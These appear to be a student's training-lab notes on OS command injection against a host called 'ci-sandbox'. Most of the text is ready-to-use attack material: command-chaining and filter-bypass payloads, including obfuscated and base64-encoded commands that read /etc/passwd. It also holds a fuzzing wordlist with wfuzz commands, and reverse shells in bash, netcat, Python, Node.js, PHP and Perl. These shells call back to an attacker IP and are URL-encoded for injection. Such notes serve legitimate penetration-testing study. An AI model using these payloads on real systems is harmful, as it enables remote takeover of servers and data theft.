#### Command Injection

In the case of Linux, we can use the semicolon (;), the logical AND (&&), the logical OR (||), and even a single pipe character (|).

```
ls -ls; id

```
We can also use && to chain commands. In this case the second command will only run if the first exits without error
A logical OR (||) will only run the second command if the first fails.

 Linux-specific inline execution1 mechanisms. Considers these examples, which use the backtick (`) character and the $() null statement to "wrap" a command ("cmd")

http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;whoami

http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|cat%20/var/tmp/exercise_chaining_flag.txt

#### Input Normalization

Add bash -c '[COMMAND]'

```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'

curl "http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|bash+-c+'bash+-i+>%26+/dev/tcp/192.168.49.51/9090+0>%261'"

```
#### Input Sanitization - Blocklisted Strings Bypass

Command substitution:

echo "I am `whoami` here"

echo "I am $(whoami) here"

Substituted command get executed first. So you can use it to get a shell.
http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1$(nc -nv 10.11.1.2 4444)  -> might need url encoding

A Null Statement Injection Bypass:

wh$()oami
n$()c -n$()lvp 9090

```

http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1;wh$()oami

```

#### Custom command list
```
bogus
;id
|id
`id`
i$()d
;i$()d
|i$()d
FAIL||i$()d
&&id
&id
FAIL_INTENT|id
FAIL_INTENT||id
`sleep 5`
`sleep 10`
`id`
$(sleep 5)
$(sleep 10)
$(id)
;`echo 'aWQK' |base64 -d`
FAIL_INTENT|`echo 'aWQK' |base64 -d`
FAIL_INTENT||`echo 'aWQK' |base64 -d`
```
Commands:

```
wfuzz -c -z file,/home/kali/command_injection_custom.txt --hc 404 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ

wfuzz -c -z file,/home/kali/command_injection_custom.txt --hc 404 --hh 1156 http://ci-sandbox:80/php/blocklisted.php?ip=127.0.0.1FUZZ


```

```
echo "cat /etc/passwd" |base64

http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`

```
might need to pass to bash or use $(cmd) for it to get executed.

echo "encoded string" | base64 -d | bash
$(echo "encoded string" | base64 -d)

#### Blind OS Command Injection Bypass

```
time curl http://ci-sandbox:80/php/blind.php?ip=127.0.0.1

time curl "http://ci-sandbox:80/php/blind.php?ip=127.0.0.1;sleep%2020"

```
1
(hacktricks.xyz, 2021), https://book.hacktricks.xyz/pentesting-web/unicode-normalization-vulnerability ↩︎

sol:
```

http://ci-sandbox/php/blocklisted.php?ip=127.0.0.1;`echo%20%22Y2F0IC9ldGMvcGFzc3dkCg==%22%20|base64%20-d`

http://ci-sandbox/php/blocklisted_exercise.php?ip=127.0.0.1$(id)
```
#### Enumerating Command Injection Capabilities

Linux:

|COMMAND	| USED FOR|
|---------------|---------|
wget	|File Transfer
curl	|File Transfer
fetch	|File Transfer
gcc	|Compilation
cc	|Compilation
nc	|Shells, File Transfer, Port Forwarding
socat	|Shells, File Transfer, Port Forwarding
ping	|Networking, Code Execution Verification
netstat	|Networking
ss	|Networking
ifconfig	|Networking
ip	|Networking
hostname	|Networking
php	|Shells, Code Execution
python	|Shells, Code Execution
python3	|Shells, Code Execution
perl	|Shells, Code Execution
java	|Shells, Code Execution

Windows:

|CAPABILITY	|USED FOR|
|-----------|--------|
Powershell	|Code Execution, Enumeration, Movement, Payload Delivery
Visual Basic	|Code Execution, Enumeration, Movement, Payload Delivery
tftp	|File Transfer
ftp	|File Transfer
certutil	|File Transfer
Python	|Code Execution, Enumeration
.NET	|Code Execution, Privilege Escalation, Payload Delivery
ipconfig	|Networking
netstat	|Networking
hostname	|Networking
systeminfo	|System Information, Patches, Versioning, Arch, etc.



capability_checks_custom.txt -> add "w00tw00t" as a baseline for a non-existent file
```
w00tw00t
wget
curl
fetch
gcc
cc
nc
socat
ping
netstat  
ss
ifconfig
ip
hostname
php
python
python3
perl
java
```
```
wfuzz -c -z file,/home/kali/capability_checks_custom.txt --hc 404 "http://ci-sandbox:80/php/index.php?ip=127.0.0.1;which FUZZ"
```

(PayloadAllTheThings, 2021), https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md ↩︎


#### Obtaining a Shell - Netcat

http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|id

```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|/bin/nc%20-nv%20192.168.49.51%209090%20-e%20/bin/bash
```
#### Obtaining a Shell - Python

Python rev shell one liner:

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.49.51",9090));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

The code:

```
import socket
import subprocess
import os

s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.49.51",9090))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);'
```

Calling:

```
http://ci-sandbox/php/index.php?ip=127.0.0.1;python%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%22192.168.49.51%22,9090));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/sh%22,%22-i%22]);%27
```
#### Obtaining a Shell - Node.js

Chained node.js reverse Shell

```
echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js

```
Full command:

```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo "require('child_process').exec('nc -nv 192.168.49.51 9090 -e /bin/bash')" > /var/tmp/offsec.js ; node /var/tmp/offsec.js
```

Url encoded:

```
http://ci-sandbox:80/nodejs/index.js?ip=127.0.0.1|echo%20%22require(%27child_process%27).exec(%27nc%20-nv%20192.168.49.51%209090%20-e%20%2Fbin%2Fbash%27)%22%20%3E%20%2Fvar%2Ftmp%2Foffsec.js%20%3B%20node%20%2Fvar%2Ftmp%2Foffsec.js
```

#### Obtaining a Shell - PHP

PHP Reverse Shell:

```
php -r '$sock=fsockopen("192.168.49.51",9090);exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);shell_exec("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);system("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);passthru("/bin/sh -i <&3 >&3 2>&3");'
php -r '$sock=fsockopen("192.168.49.51",9090);popen("/bin/sh -i <&3 >&3 2>&3", "r");'

```
PHP Execution options:

```
exec("/bin/sh -i <&3 >&3 2>&3");'
shell_exec("/bin/sh -i <&3 >&3 2>&3");'
system("/bin/sh -i <&3 >&3 2>&3");'
passthru("/bin/sh -i <&3 >&3 2>&3");'
popen("/bin/sh -i <&3 >&3 2>&3", "r");'

```
Unencoded endpoint:

```
http://ci-sandbox/php/index.php?ip=127.0.0.1;php -r "system(\"bash -c 'bash -i >& /dev/tcp/192.168.49.51/9090 0>&1'\");"

```

Complete Endpoint:

```
http://ci-sandbox/php/index.php?ip=127.0.0.1;php%20-r%20%22system(%5C%22bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.49.51%2F9090%200%3E%261%27%5C%22)%3B%22

```

#### Obtaining a Shell - Perl

Perl reverse shell one liner

```
perl -e 'use Socket;$i="192.168.49.51";$p=9090;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

```

Perl reverse shell:

```
use Socket;
$i="192.168.49.51";
$p=9090;

socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));

if(connect(S,sockaddr_in($p,inet_aton($i)))) {
     open(STDIN,">&S");
     open(STDOUT,">&S");
     open(STDERR,">&S");
     exec("/bin/sh -i");
}

```

URL Encoded:

```
http://ci-sandbox/nodejs/index.js?ip=127.0.0.1|perl%20-e%20%27use%20Socket%3B%24i%3D%22192.168.49.51%22%3B%24p%3D9090%3Bsocket(S%2CPF_INET%2CSOCK_STREAM%2Cgetprotobyname(%22tcp%22))%3Bif(connect(S%2Csockaddr_in(%24p%2Cinet_aton(%24i))))%7Bopen(STDIN%2C%22%3E%26S%22)%3Bopen(STDOUT%2C%22%3E%26S%22)%3Bopen(STDERR%2C%22%3E%26S%22)%3Bexec(%22%2Fbin%2Fsh%20-i%22)%3B%7D%3B%27

```
